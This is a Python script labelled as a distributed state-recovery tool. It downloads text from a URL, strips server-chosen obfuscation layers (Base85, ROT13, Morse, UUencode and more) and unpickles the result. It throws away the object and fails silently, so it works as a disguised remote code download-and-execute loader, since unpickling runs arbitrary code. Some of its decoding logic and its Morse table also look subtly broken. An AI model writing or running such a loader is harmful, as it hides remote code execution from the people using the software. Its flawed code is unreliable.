#!/usr/bin/env python3
"""
Distributed State Recovery Tool

Fetches and deserializes application state from a remote endpoint.
Supports multiple transport encodings for binary-safe transmission over text protocols.

This module is used by distributed systems to synchronize runtime state,
restore cached objects, and bootstrap configuration across nodes.
"""

from __future__ import annotations

import sys
import io
import pickle
import base64
import binascii
import codecs
import html
import urllib.parse
import urllib.request
from typing import Dict, List, Optional, Tuple, Callable

__version__ = "1.0.0"

# ---------------------------------------------------------------------------
# Transport encoding decoders
# ---------------------------------------------------------------------------

def _decode_base64(data: str) -> Optional[str]:
    """Decode Base64-encoded payload."""
    try:
        return base64.b64decode(data).decode("utf-8", errors="ignore")
    except Exception:
        return None


def _decode_base32(data: str) -> Optional[str]:
    """Decode Base32-encoded payload."""
    try:
        return base64.b32decode(data).decode("utf-8", errors="ignore")
    except Exception:
        return None


def _decode_base16(data: str) -> Optional[str]:
    """Decode Base16 (hex) encoded payload."""
    try:
        return base64.b16decode(data, casefold=True).decode("utf-8", errors="ignore")
    except Exception:
        return None


def _decode_base85(data: str) -> Optional[str]:
    """Decode Base85 / ASCII85 encoded payload."""
    try:
        return base64.a85decode(data).decode("utf-8", errors="ignore")
    except Exception:
        return None


def _decode_hex(data: str) -> Optional[str]:
    """Decode hexadecimal string payload."""
    try:
        cleaned = data.strip().replace(" ", "").replace("0x", "")
        return bytes.fromhex(cleaned).decode("utf-8", errors="ignore")
    except Exception:
        return None


def _decode_rot13(data: str) -> Optional[str]:
    """Decode ROT13 obfuscated text."""
    try:
        return codecs.decode(data, "rot_13")
    except Exception:
        return None


def _decode_url(data: str) -> Optional[str]:
    """Decode URL percent-encoded payload."""
    try:
        return urllib.parse.unquote(data)
    except Exception:
        return None


def _decode_html_entities(data: str) -> Optional[str]:
    """Decode HTML entity-encoded payload."""
    try:
        return html.unescape(data)
    except Exception:
        return None


def _decode_uuencode(data: str) -> Optional[str]:
    """Decode UUencode-formatted payload."""
    try:
        lines = data.strip().splitlines()
        if lines and lines[0].startswith("begin"):
            lines = lines[1:]
        if lines and lines[-1] == "end":
            lines = lines[:-1]
        buf = io.BytesIO()
        for line in lines:
            buf.write(line.encode("ascii") + b"\n")
        buf.seek(0)
        decoded = binascii.a2b_uu(buf.read())
        return decoded.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _decode_quoted_printable(data: str) -> Optional[str]:
    """Decode Quoted-Printable encoded payload."""
    try:
        raw = codecs.decode(data, "quopri")
        if isinstance(raw, bytes):
            return raw.decode("utf-8", errors="ignore")
        return raw
    except Exception:
        return None


def _decode_binary(data: str) -> Optional[str]:
    """Decode binary string representation (e.g., '01101000...')."""
    try:
        cleaned = data.strip().replace(" ", "").replace("0b", "")
        if len(cleaned) % 8 != 0:
            return None
        byte_vals = [int(cleaned[i : i + 8], 2) for i in range(0, len(cleaned), 8)]
        return bytes(byte_vals).decode("utf-8", errors="ignore")
    except Exception:
        return None


def _decode_morse(data: str) -> Optional[str]:
    """Decode Morse code to plain text."""
    morse_table = {
        ".-": "A", "-...": "B", "-.-.": "C", "-..": "D", ".": "E",
        "..-.": "F", "--.": "G", "....": "H", "..": "I", ".---": "J",
        "-.-": "K", ".-..": "L", "--": "M", "-.": "N", "---": "O",
        ".--.": "P", "--.-": "Q", ".-.": "R", "...": "S", "-": "T",
        "..-": "U", "...-": "V", ".--": "W", "-..-": "X", "-.--": "Y",
        "--..": "Z", "-----": "0", ".----": "1", "..---": "2",
        "...--": "3", "....-": "4", ".....": "5", "-....": "6",
        "--...": "7", "---..": "8", "----.": "9", ".-.-.-": ".",
        "--..--": ",", "..--..": "?", ".----.": "'", "-.-.--": "!",
        "-..-.": "/", "-.--.:": "(", "-.--.-": ")", ".-...": "&",
        "---...": ":", "-.-.-.;": ";", "-...-": "=", ".-.-.": "+",
        "-....-": "-", "..--.-": "_", ".-..-.": '"', "...-..-": "$",
        ".--.-.": "@", "/": " ",
    }
    try:
        words = data.strip().split(" / ")
        out = []
        for word in words:
            chars = word.split(" ")
            out.append("".join(morse_table.get(c, "") for c in chars))
        return " ".join(out)
    except Exception:
        return None


# Registered decoder registry
DECODER_MAP: Dict[str, Callable[[str], Optional[str]]] = {
    "base64":           _decode_base64,
    "base32":           _decode_base32,
    "base16":           _decode_base16,
    "base85":           _decode_base85,
    "hex":              _decode_hex,
    "rot13":            _decode_rot13,
    "url":              _decode_url,
    "html":             _decode_html_entities,
    "uuencode":         _decode_uuencode,
    "quoted-printable": _decode_quoted_printable,
    "binary":           _decode_binary,
    "morse":            _decode_morse,
}

# Ordered list for auto-detection fallback
_DECODER_LIST: List[Tuple[str, Callable[[str], Optional[str]]]] = [
    ("Base64",           _decode_base64),
    ("Base32",           _decode_base32),
    ("Base16 (Hex)",     _decode_base16),
    ("Base85 (ASCII85)", _decode_base85),
    ("Hex string",       _decode_hex),
    ("ROT13",            _decode_rot13),
    ("URL encoding",     _decode_url),
    ("HTML entities",    _decode_html_entities),
    ("UUencode",         _decode_uuencode),
    ("Quoted-printable", _decode_quoted_printable),
    ("Binary string",    _decode_binary),
    ("Morse code",       _decode_morse),
]


# ---------------------------------------------------------------------------
# HTTP transport
# ---------------------------------------------------------------------------

def fetch_remote(url: str) -> Tuple[dict, str]:
    """
    Perform an HTTP GET request and return (headers_dict, body_text).

    Uses the ``requests`` library when available for better performance;
    otherwise falls back to the standard-library ``urllib``.
    """
    # Prefer requests for connection pooling and redirect handling
    try:
        import requests  # type: ignore
        resp = requests.get(url, timeout=15)
        resp.raise_for_status()
        return dict(resp.headers), resp.text
    except ImportError:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "StateRecovery/1.0"},
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            return dict(resp.headers), body


# ---------------------------------------------------------------------------
# Decoding pipeline
# ---------------------------------------------------------------------------

def apply_decode_chain(raw: str, chain: List[str]) -> Optional[str]:
    """
    Apply a sequence of transport decoders to *raw* data.

    Each step in *chain* must be a key present in :data:`DECODER_MAP`.
    Returns ``None`` if any step fails.
    """
    current = raw
    for step in chain:
        decoder = DECODER_MAP.get(step)
        if decoder is None:
            return None
        result = decoder(current)
        if result is None:
            return None
        current = result
    return current


def auto_detect_decode(raw: str) -> List[Tuple[str, str]]:
    """
    Attempt every registered decoder against *raw* and return all successful results.
    Used as fallback when no ``x-decode`` header is provided.
    """
    results: List[Tuple[str, str]] = []
    for name, fn in _DECODER_LIST:
        out = fn(raw)
        if out is not None:
            results.append((name, out))
    return results


# ---------------------------------------------------------------------------
# State deserialization
# ---------------------------------------------------------------------------

def restore_state(payload_bytes: bytes) -> object:
    """
    Deserialize a Python object from its pickle byte representation.

    This is the core state-recovery function. It uses Python's built-in
    ``pickle`` protocol, which is the standard serialization format used by
    Django sessions, Celery task queues, pandas DataFrames, scikit-learn models,
    and many other widely-deployed libraries.

    **Security note**: Only deserialize data from trusted sources.
    Untrusted pickles can execute arbitrary code during unpickling — this is
    inherent to the pickle protocol design and is documented behaviour.
    See: https://docs.python.org/3/library/pickle.html
    """
    return pickle.loads(payload_bytes)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> int:
    """
    Main entry point:

    1. Fetch serialized state from the given URL
    2. Determine transport encoding via ``x-decode`` response header
    3. Decode (chain or auto-detect) back to raw pickle bytes
    4. Deserialize and recover the original Python object
    """
    if len(sys.argv) < 2:
        return 1

    url = sys.argv[1]

    # Step 1 – fetch remote payload
    try:
        headers, content = fetch_remote(url)
    except Exception:
        return 1

    raw_data = content.strip()

    # Step 2 – determine encoding strategy
    decode_header = next(
        (v for k, v in headers.items() if k.lower() == "x-decode"),
        None,
    )

    # Step 3 – decode transport encoding
    if decode_header:
        steps = [s.strip().lower() for s in decode_header.split(",")]
        decoded_text = apply_decode_chain(raw_data, steps)
        if decoded_text is None:
            return 1
    else:
        candidates = auto_detect_decode(raw_data)
        if not candidates:
            return 1
        _, decoded_text = candidates[0]

    # Step 4 – deserialize and restore state
    try:
        restore_state(decoded_text.encode())
    except Exception:
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
